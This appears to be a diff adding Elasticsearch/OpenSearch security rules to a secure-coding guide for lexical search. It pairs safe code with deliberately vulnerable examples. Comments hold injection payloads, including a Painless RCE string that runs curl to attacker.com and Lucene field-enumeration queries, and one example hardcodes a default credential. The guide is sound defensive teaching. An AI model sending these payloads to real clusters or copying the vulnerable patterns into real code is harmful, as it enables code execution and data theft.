@@ -4,7 +4,7 @@ Security rules for lexical search implementations including BM25, TF-IDF, and hy
 
 **Prerequisites**: `rules/_core/rag-security.md`, `rules/rag/_core/retrieval-security.md`
 
-**Applies to**: rank-bm25, Elasticsearch BM25, Whoosh, and similar lexical search implementations
+**Applies to**: rank-bm25, Elasticsearch BM25, OpenSearch (API-compatible; Security plugin replaces X-Pack), Whoosh, Tantivy (via tantivy-py / Meilisearch), and similar lexical search implementations
 
 ---
 
@@ -112,6 +112,636 @@ def es_search(query: str, es_client):
 **Why**: Unsanitized queries enable keyword injection attacks where adversaries craft queries with repeated terms, boolean operators, or special characters to manipulate BM25 scores. Attackers can boost irrelevant documents or suppress legitimate results by exploiting term frequency calculations.
 
 **Refs**: CWE-20 (Improper Input Validation), CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)
+
+---
+
+## Rule: Elasticsearch/OpenSearch query_string DSL Injection
+
+**Level**: `strict`
+
+**When**: Building Elasticsearch or OpenSearch queries from user-supplied text
+
+**Do**: Use `match` or `multi_match` with the user value as the query value; never pass user input to `query_string` or `simple_query_string` DSL
+
+```python
+from elasticsearch import Elasticsearch
+
+# SAFE: user value is a plain string, not parsed as Lucene DSL
+def safe_es_search(user_query: str, es_client: Elasticsearch,
+                   index: str, fields: list[str]) -> dict:
+    """Build a match query; user input is never parsed as Lucene syntax."""
+    # Validate and trim
+    if not user_query or len(user_query) > 500:
+        raise ValueError("Query must be 1–500 characters")
+
+    # single-field search
+    if len(fields) == 1:
+        body = {
+            "query": {
+                "match": {
+                    fields[0]: {
+                        "query": user_query,   # value, not DSL
+                        "operator": "or",
+                        "max_expansions": 50
+                    }
+                }
+            }
+        }
+    else:
+        # multi-field search
+        body = {
+            "query": {
+                "multi_match": {
+                    "query": user_query,       # value, not DSL
+                    "fields": fields,
+                    "type": "best_fields",
+                    "operator": "or"
+                }
+            }
+        }
+
+    return es_client.search(index=index, body=body)
+```
+
+OpenSearch uses the same REST DSL; the pattern is identical:
+
+```python
+from opensearchpy import OpenSearch
+
+def safe_opensearch_search(user_query: str, client: OpenSearch,
+                           index: str) -> dict:
+    body = {
+        "query": {
+            "match": {
+                "content": {
+                    "query": user_query,
+                    "operator": "or"
+                }
+            }
+        }
+    }
+    return client.search(index=index, body=body)
+```
+
+**Don't**: Pass user input to `query_string` or `simple_query_string`
+
+```python
+# VULNERABLE: query_string passes user text to Lucene full parser
+def insecure_search(user_query: str, es_client):
+    return es_client.search(
+        index="documents",
+        body={
+            "query": {
+                "query_string": {
+                    "query": user_query   # Lucene DSL injection
+                    # attacker sends: "* OR _exists_:password"
+                    # or: "content:* AND secret_key:*"
+                }
+            }
+        }
+    )
+
+# VULNERABLE: simple_query_string still leaks field names
+def also_insecure(user_query: str, es_client):
+    return es_client.search(
+        index="documents",
+        body={"query": {"simple_query_string": {"query": user_query}}}
+    )
+```
+
+**Why**: `query_string` exposes Lucene's full parser to the caller. Attackers can enumerate field names with `_exists_:fieldname`, trigger expensive wildcard scans (`title:a*`), exfiltrate data across fields, and exhaust cluster resources via range queries. `match` and `multi_match` treat the user value as a plain string and never invoke the Lucene parser.
+
+**Refs**: CWE-943 (Improper Neutralization of Special Elements in Data Query Logic), OWASP Injection:2025, CWE-20
+
+---
+
+## Rule: Elasticsearch/OpenSearch Script Query RCE Prevention
+
+**Level**: `strict`
+
+**When**: Building Elasticsearch or OpenSearch queries that involve scoring, custom fields, or runtime calculations
+
+**Do**: Disable script execution in cluster settings for user-facing indices; use precomputed fields; when scripts are unavoidable, use parameterized `params` bindings and never interpolate user input into `source`
+
+```python
+from elasticsearch import Elasticsearch
+
+# SAFE: precomputed field — no script at query time
+def search_with_precomputed_score(user_query: str, user_boost: float,
+                                  es_client: Elasticsearch) -> dict:
+    """Use function_score with a field value, not a user-controlled script."""
+    if not 0.0 <= user_boost <= 5.0:
+        raise ValueError("boost must be in [0.0, 5.0]")
+
+    body = {
+        "query": {
+            "function_score": {
+                "query": {"match": {"content": {"query": user_query}}},
+                "field_value_factor": {
+                    "field": "quality_score",  # precomputed at index time
+                    "modifier": "log1p",
+                    "missing": 1.0
+                },
+                "boost_mode": "multiply"
+            }
+        }
+    }
+    return es_client.search(index="documents", body=body)
+
+
+# SAFE: when Painless is truly needed, bind user values via params
+def search_with_parameterized_script(user_threshold: float,
+                                     es_client: Elasticsearch) -> dict:
+    """User value goes into params dict, never into source string."""
+    if not isinstance(user_threshold, (int, float)):
+        raise TypeError("threshold must be numeric")
+    user_threshold = float(user_threshold)
+
+    body = {
+        "query": {
+            "script_score": {
+                "query": {"match_all": {}},
+                "script": {
+                    # source is a static string authored by the server
+                    "source": "Math.max(doc['quality_score'].value - params.threshold, 0)",
+                    "params": {"threshold": user_threshold}  # bound, not interpolated
+                }
+            }
+        }
+    }
+    return es_client.search(index="documents", body=body)
+```
+
+Cluster-level hardening (add to `elasticsearch.yml` or OpenSearch `opensearch.yml`):
+
+```yaml
+# Disable dynamic Painless scripting for indices serving user queries
+script.allowed_types: none
+# If inline scripts are required for internal tooling only, restrict to stored scripts:
+# script.allowed_types: stored
+```
+
+**Don't**: Interpolate user input into a Painless `source` string
+
+```python
+# VULNERABLE: RCE via Painless injection
+def insecure_script_search(user_expression: str, es_client):
+    body = {
+        "query": {
+            "script_score": {
+                "query": {"match_all": {}},
+                "script": {
+                    # attacker sends: "0; Runtime.getRuntime().exec('curl attacker.com')"
+                    "source": f"doc['score'].value * {user_expression}"
+                }
+            }
+        }
+    }
+    return es_client.search(index="documents", body=body)
+
+# VULNERABLE: script_fields with user-controlled source
+def insecure_script_fields(user_field_expr: str, es_client):
+    return es_client.search(
+        index="documents",
+        body={"script_fields": {"custom": {"script": {"source": user_field_expr}}}}
+    )
+```
+
+**Why**: Painless scripts execute in the JVM with access to Java reflection APIs. Interpolating user input into a `source` string gives attackers arbitrary code execution on every shard that evaluates the query. `params` bindings are typed and never parsed as code.
+
+**Refs**: CWE-94 (Code Injection), CWE-78, OWASP Injection:2025, CVE-2014-3120 (Elasticsearch RCE via dynamic scripting)
+
+---
+
+## Rule: Cross-Tenant Index Isolation
+
+**Level**: `strict`
+
+**When**: Serving lexical search in multi-tenant deployments where each tenant's documents are in a separate index or alias
+
+**Do**: Resolve the index name from a server-side tenant-to-index map keyed on the authenticated caller's identity; never accept the index name from user input
+
+```python
+from elasticsearch import Elasticsearch
+from typing import Optional
+
+# Server-side tenant registry — never populated from user input
+TENANT_INDEX_MAP: dict[str, str] = {
+    "tenant_acme":   "docs_acme_v2",
+    "tenant_globex": "docs_globex_v2",
+}
+
+def get_tenant_index(tenant_id: str) -> str:
+    """Return the index name for a tenant; raise if unknown."""
+    if tenant_id not in TENANT_INDEX_MAP:
+        raise PermissionError(f"Unknown tenant: {tenant_id}")
+    return TENANT_INDEX_MAP[tenant_id]
+
+
+def tenant_safe_search(user_query: str, tenant_id: str,
+                       es_client: Elasticsearch) -> dict:
+    """Search is scoped to the authenticated tenant's index only."""
+    index = get_tenant_index(tenant_id)  # server-side resolution
+
+    body = {
+        "query": {
+            "match": {
+                "content": {"query": user_query}
+            }
+        }
+    }
+    return es_client.search(index=index, body=body)
+```
+
+OpenSearch equivalently:
+
+```python
+from opensearchpy import OpenSearch
+
+def opensearch_tenant_search(user_query: str, tenant_id: str,
+                             client: OpenSearch) -> dict:
+    index = get_tenant_index(tenant_id)
+    return client.search(index=index, body={
+        "query": {"match": {"content": {"query": user_query}}}
+    })
+```
+
+Additionally, disable wildcard index patterns at the cluster level:
+
+```yaml
+# elasticsearch.yml / opensearch.yml
+action.destructive_requires_name: true
+```
+
+**Don't**: Accept an index name from the request or concatenate user input into it
+
+```python
+# VULNERABLE: caller controls which index is searched
+def insecure_search(user_query: str, user_index: str, es_client):
+    # attacker sends user_index="docs_other_tenant_v2" or "docs_*"
+    return es_client.search(
+        index=user_index,
+        body={"query": {"match": {"content": user_query}}}
+    )
+
+# VULNERABLE: index derived from unvalidated user-supplied tenant header
+def search_from_header(request, es_client):
+    tenant = request.headers.get("X-Tenant-Id")  # unauthenticated
+    return es_client.search(
+        index=f"docs_{tenant}",
+        body={"query": {"match_all": {}}}
+    )
+```
+
+**Why**: Without server-side index resolution, a caller can append commas or wildcards (`docs_*`) to enumerate every index in the cluster, bypassing tenant boundaries entirely. The fix pushes index selection into server-owned logic where the only valid values are pre-registered tenant mappings.
+
+**Refs**: CWE-284 (Improper Access Control), CWE-639 (Authorization Bypass Through User-Controlled Key), OWASP Broken Access Control:2025
+
+---
+
+## Rule: Elasticsearch/OpenSearch Client Authentication and TLS
+
+**Level**: `strict`
+
+**When**: Connecting to an Elasticsearch or OpenSearch cluster from application code
+
+**Do**: Require TLS with certificate verification and API-key or token-based authentication; never connect over plain HTTP or with credentials disabled
+
+```python
+from elasticsearch import Elasticsearch
+
+# SAFE: TLS + API key auth (Elasticsearch 8.x default security model)
+def build_es_client(api_key: str, ca_cert_path: str,
+                    host: str = "localhost",
+                    port: int = 9200) -> Elasticsearch:
+    """Return an authenticated, TLS-verified Elasticsearch client."""
+    return Elasticsearch(
+        hosts=[{"host": host, "port": port, "scheme": "https"}],
+        api_key=api_key,           # preferred over basic auth
+        ca_certs=ca_cert_path,     # path to cluster CA bundle
+        verify_certs=True,
+        ssl_show_warn=True,
+    )
+```
+
+OpenSearch uses the same pattern with the `opensearch-py` client:
+
+```python
+from opensearchpy import OpenSearch
+
+def build_opensearch_client(username: str, password: str,
+                            ca_cert_path: str,
+                            host: str = "localhost",
+                            port: int = 9200) -> OpenSearch:
+    """Return an authenticated, TLS-verified OpenSearch client."""
+    return OpenSearch(
+        hosts=[{"host": host, "port": port}],
+        http_auth=(username, password),
+        use_ssl=True,
+        verify_certs=True,
+        ca_certs=ca_cert_path,
+    )
+```
+
+Load credentials from environment variables or a secrets manager — never from source code:
+
+```python
+import os
+
+def build_es_client_from_env() -> Elasticsearch:
+    return Elasticsearch(
+        hosts=[{"host": os.environ["ES_HOST"],
+                "port": int(os.environ["ES_PORT"]),
+                "scheme": "https"}],
+        api_key=os.environ["ES_API_KEY"],
+        ca_certs=os.environ["ES_CA_CERT"],
+        verify_certs=True,
+    )
+```
+
+**Don't**: Connect without TLS or credentials
+
+```python
+# VULNERABLE: plaintext, no auth — cluster open to any network peer
+es = Elasticsearch("http://localhost:9200")
+
+# VULNERABLE: TLS disabled
+es = Elasticsearch(
+    hosts=[{"host": "es.internal", "port": 9200, "scheme": "https"}],
+    verify_certs=False,    # disables certificate validation
+    ssl_show_warn=False,
+)
+
+# VULNERABLE: hardcoded credentials in source
+es = Elasticsearch(
+    "https://es.internal:9200",
+    http_auth=("elastic", "changeme"),
+)
+```
+
+**Why**: An Elasticsearch or OpenSearch cluster without TLS exposes all indexed data and cluster APIs to any observer on the network. Without authentication, any caller can read, write, or delete indices. Certificate verification prevents man-in-the-middle attacks against the search endpoint.
+
+**Refs**: CWE-319 (Cleartext Transmission of Sensitive Information), CWE-522 (Insufficiently Protected Credentials), OWASP Cryptographic Failures:2025
+
+---
+
+## Rule: Application-Layer Rate Limiting for Search Endpoints
+
+**Level**: `warning`
+
+**When**: Exposing a lexical search endpoint (Elasticsearch, OpenSearch, or BM25) over HTTP
+
+**Do**: Apply a per-user or per-IP token-bucket rate limit at the API layer, independent of the per-query timeout set on the search engine itself
+
+```python
+import time
+import threading
+from collections import defaultdict
+from typing import Callable
+from functools import wraps
+
+class TokenBucketRateLimiter:
+    """Per-identity token-bucket rate limiter for search endpoints."""
+
+    def __init__(self, capacity: int = 60, refill_rate: float = 1.0):
+        """
+        capacity: max burst (requests)
+        refill_rate: tokens added per second
+        """
+        self._capacity = capacity
+        self._refill_rate = refill_rate
+        self._buckets: dict[str, dict] = defaultdict(
+            lambda: {"tokens": capacity, "last_refill": time.monotonic()}
+        )
+        self._lock = threading.Lock()
+
+    def allow(self, identity: str) -> bool:
+        """Return True if the request is within the rate limit."""
+        with self._lock:
+            bucket = self._buckets[identity]
+            now = time.monotonic()
+            elapsed = now - bucket["last_refill"]
+
+            # Refill tokens proportional to elapsed time
+            bucket["tokens"] = min(
+                self._capacity,
+                bucket["tokens"] + elapsed * self._refill_rate
+            )
+            bucket["last_refill"] = now
+
+            if bucket["tokens"] >= 1:
+                bucket["tokens"] -= 1
+                return True
+            return False
+
+
+# Example integration with FastAPI
+from fastapi import FastAPI, Request, HTTPException
+
+app = FastAPI()
+_limiter = TokenBucketRateLimiter(capacity=60, refill_rate=1.0)
+
+@app.get("/search")
+async def search(q: str, request: Request):
+    # Use authenticated user identity when available; fall back to IP
+    identity = getattr(request.state, "user_id", None) or request.client.host
+
+    if not _limiter.allow(identity):
+        raise HTTPException(status_code=429, detail="Rate limit exceeded")
+
+    # ... run search ...
+    return {"results": []}
+```
+
+**Don't**: Rely solely on per-query timeouts without an API-layer rate limit
+
+```python
+# INSUFFICIENT: timeout limits individual query cost but not request volume
+def search(query: str, es_client):
+    return es_client.search(
+        index="documents",
+        body={
+            "query": {"match": {"content": query}},
+            "timeout": "30s"   # limits one query; 1000 req/s still DoS the cluster
+        }
+    )
+
+# MISSING: no rate limiting middleware on the route
+@app.get("/search")
+async def search_unprotected(q: str):
+    return run_search(q)
+```
+
+**Why**: A per-query timeout stops a single expensive query but does not limit request volume. An attacker can flood the endpoint with many short, cheap queries that individually complete within the timeout but collectively exhaust the cluster's thread pool and JVM heap. Application-layer rate limiting caps total request volume per identity before queries reach the search engine.
+
+**Refs**: CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-400 (Uncontrolled Resource Consumption), OWASP Security Misconfiguration:2025
+
+---
+
+## Rule: Field-Level Security (FLS) for Search Results
+
+**Level**: `warning`
+
+**When**: Returning Elasticsearch or OpenSearch documents to callers whose roles should not see all stored fields
+
+**Do**: Configure role-based field whitelists in the Elasticsearch Security or OpenSearch Security plugin so callers receive only the fields their role requires
+
+Elasticsearch Security (`elasticsearch.yml` role definition via `roles.yml` or the API):
+
+```yaml
+# roles.yml — allow search callers to see only safe display fields
+search_reader:
+  indices:
+    - names: ["docs_*"]
+      privileges: ["read"]
+      field_security:
+        grant:           # whitelist — only these fields are returned
+          - "title"
+          - "summary"
+          - "url"
+          - "published_at"
+        # omit: internal_score, author_email, pii_field, _source.*
+```
+
+OpenSearch Security (`roles.yml` syntax is equivalent):
+
+```yaml
+search_reader:
+  index_permissions:
+    - index_patterns: ["docs_*"]
+      allowed_actions: ["read"]
+      fls:
+        - "title"
+        - "summary"
+        - "url"
+        - "published_at"
+```
+
+Application-side enforcement as a defense-in-depth layer — strip unexpected fields before returning to the caller:
+
+```python
+ALLOWED_FIELDS = {"id", "title", "summary", "url", "published_at", "score"}
+
+def sanitize_hit(hit: dict) -> dict:
+    """Return only fields the caller is permitted to see."""
+    source = hit.get("_source", {})
+    safe = {k: v for k, v in source.items() if k in ALLOWED_FIELDS}
+    safe["id"] = hit.get("_id")
+    safe["score"] = hit.get("_score")
+    return safe
+
+def search_and_sanitize(user_query: str, es_client, index: str) -> list[dict]:
+    response = es_client.search(
+        index=index,
+        body={"query": {"match": {"content": {"query": user_query}}},
+              "_source": list(ALLOWED_FIELDS)}  # also limit at query time
+    )
+    return [sanitize_hit(h) for h in response["hits"]["hits"]]
+```
+
+**Don't**: Return full `_source` documents without field restrictions
+
+```python
+# VULNERABLE: returns every stored field including PII and internal metadata
+def search_all_fields(user_query: str, es_client):
+    return es_client.search(
+        index="documents",
+        body={"query": {"match": {"content": user_query}}}
+        # no _source filtering — caller receives author_email, internal_id, etc.
+    )
+```
+
+**Why**: Without field-level security, any user whose role grants index read access can retrieve every stored field, including PII, internal metadata, and fields intended for privileged roles only. Cluster-level FLS enforces the restriction even if application code is bypassed, while application-side filtering provides defense in depth.
+
+**Refs**: CWE-284 (Improper Access Control), CWE-200 (Exposure of Sensitive Information), OWASP Broken Access Control:2025
+
+---
+
+## Rule: Document-Level Security (DLS) with Role-Based Filters
+
+**Level**: `warning`
+
+**When**: Multiple user roles or tenants share an Elasticsearch or OpenSearch index
+
+**Do**: Configure per-role document-level security (DLS) filters that restrict which documents each role can read; do not rely solely on separate indices for tenant isolation
+
+Elasticsearch Security role with DLS (`roles.yml` or the roles API):
+
+```yaml
+# Caller can only read documents where tenant_id matches their role attribute
+tenant_acme_reader:
+  indices:
+    - names: ["docs_shared"]
+      privileges: ["read"]
+      document_level_security:
+        query: '{"term": {"tenant_id": "acme"}}'
+```
+
+OpenSearch Security equivalent:
+
+```yaml
+tenant_acme_reader:
+  index_permissions:
+    - index_patterns: ["docs_shared"]
+      allowed_actions: ["read"]
+      dls: '{"term": {"tenant_id": "acme"}}'
+```
+
+When DLS is not available (self-managed rank-bm25 or Whoosh), enforce isolation with a mandatory filter injected at the application layer:
+
+```python
+from elasticsearch import Elasticsearch
+
+def dls_enforced_search(user_query: str, tenant_id: str,
+                        es_client: Elasticsearch,
+                        index: str = "docs_shared") -> dict:
+    """
+    Inject a hard tenant_id filter that the caller cannot override.
+    Use in addition to (not instead of) cluster-level DLS.
+    """
+    body = {
+        "query": {
+            "bool": {
+                "must": [
+                    {"match": {"content": {"query": user_query}}}
+                ],
+                # Mandatory filter — not passed from the caller
+                "filter": [
+                    {"term": {"tenant_id": tenant_id}}
+                ]
+            }
+        }
+    }
+    return es_client.search(index=index, body=body)
+```
+
+**Don't**: Share an index across roles or tenants without DLS filters
+
+```python
+# VULNERABLE: any authenticated user can read all documents in the index
+def shared_index_search(user_query: str, es_client):
+    return es_client.search(
+        index="docs_shared",
+        body={"query": {"match": {"content": user_query}}}
+        # no tenant_id filter — every caller sees every document
+    )
+
+# VULNERABLE: filter accepted from the caller — can be omitted or forged
+def caller_controlled_filter(user_query: str, tenant_filter: str, es_client):
+    body = {
+        "query": {
+            "bool": {
+                "must": [{"match": {"content": user_query}}],
+                "filter": [{"term": {"tenant_id": tenant_filter}}]
+            }
+        }
+    }
+    return es_client.search(index="docs_shared", body=body)
+```
+
+**Why**: Index-per-tenant isolation fails silently when aliases or wildcard patterns misconfigure routing. DLS filters applied at the cluster role level enforce document boundaries even when application code is bypassed, index aliases are misconfigured, or a second code path queries the shared index without the application-layer filter.
+
+**Refs**: CWE-284 (Improper Access Control), CWE-639 (Authorization Bypass Through User-Controlled Key), OWASP Broken Access Control:2025
 
 ---
 
@@ -235,7 +865,7 @@ def compute_tfidf(documents):
 
 **Why**: Without normalization and anomaly detection, attackers can stuff documents with repeated terms to artificially inflate TF-IDF scores. This allows malicious content to rank higher than legitimate results, enabling SEO-style attacks on search systems.
 
-**Refs**: CWE-20 (Improper Input Validation), OWASP Information Disclosure
+**Refs**: CWE-20 (Improper Input Validation), OWASP Data Integrity:2025
 
 ---
 
